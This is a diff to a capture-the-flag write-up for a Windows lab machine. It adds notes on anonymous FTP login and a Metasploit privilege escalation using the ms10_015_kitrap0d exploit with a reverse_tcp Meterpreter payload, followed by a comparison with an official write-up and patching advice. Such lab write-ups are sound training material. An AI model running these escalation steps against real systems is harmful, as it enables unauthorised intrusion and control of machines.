@@ -26,7 +26,7 @@ Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
 ```
 
 We see a ftp, and http port open here.
-I quickly check out the website, but it's very bare, so lets check out the ftp.
+I quickly check out the website, but it's very bare, so lets check out the ftp. We can see from the scan that anonymous login is allowed. So we can fill out both name and password with "anonymous"
 
 ```
 sudo rlwrap ftp 10.129.82.146
@@ -159,7 +159,8 @@ So I set the current connection to the background by just sending the command:
 
 `meterpreter > background`
 
-And used meterpreters own exploit suggester to find a possible escalation exploit.
+And used meterpreters own exploit suggester to find a possible escalation exploit. Which is only possible on x86 architecture.
+This can be checked with the `sysinfo` command in metasploit. 
 
 ```
 msf6 exploit(multi/handler) > use post/multi/recon/local_exploit_suggester
@@ -194,6 +195,9 @@ nil versions are discouraged and will be deprecated in Rubygems 4
 [*] Post module execution completed
 ```
 
+I tried the bypassuac_eventvwr, but it failed. The next one works, however:
+
+
 ```
 msf6 post(multi/recon/local_exploit_suggester) > use exploit/windows/local/ms10_015_kitrap0d 
 [*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
@@ -224,6 +228,8 @@ Exploit target:
 
 msf6 exploit(windows/local/ms10_015_kitrap0d) > set lhost 10.10.14.36
 lhost => 10.10.14.75
+msf6 exploit(windows/local/ms10_015_kitrap0d) > set session 1
+session => 1
 msf6 exploit(windows/local/ms10_015_kitrap0d) > run
 ```
 
@@ -289,4 +295,22 @@ meterpreter > download user.txt.txt
 [*] download   : user.txt.txt -> user.txt.txt
 meterpreter > 
 ```
+
+## Comparing to the official writeup:
+
+The official writeup first tested dirbuster against the webserver, which does not reveal anything. So they assume the most likely attack vector is ftp. We essentially did the same thing, but their method was faster than mine. As I manually went through the site, checking for something interesting. Dirbuster was a good choice, especially since the main page does not link to anything else, except out of the domain. 
+
+The official writeup immediately recognizes the ASP.NET client, and therefore knows that .aspx is what needs to be used. While I had to do some trial and error to discover this. Now I know.
+
+After getting access, they immediately run getuid to reveal that they are the IIS user. They know that this user does not have write permissions for the machine. And immediately begin setting up for privilege escalation. I did some sleuthing around to check if I could get privilege on the user, before giving up and looking to the metasploit framework for escalation.
+
+Overall the official writeup just seems to have more experience. And is therefore able to take more efficient decisions. I am sure this will come with time.
+
+## How to stop this exploit:
+
+First of all, the anonymous ftp user should not have write access to the server at all. The anonymous user should probably just be removed unless necessary for some reason.
+
+And secondly, to stop the privilege escalation. Patch the operating system. Keep it updated.
+
+there is a complete explanation of the exploit here: https://www.exploit-db.com/exploits/11199
 
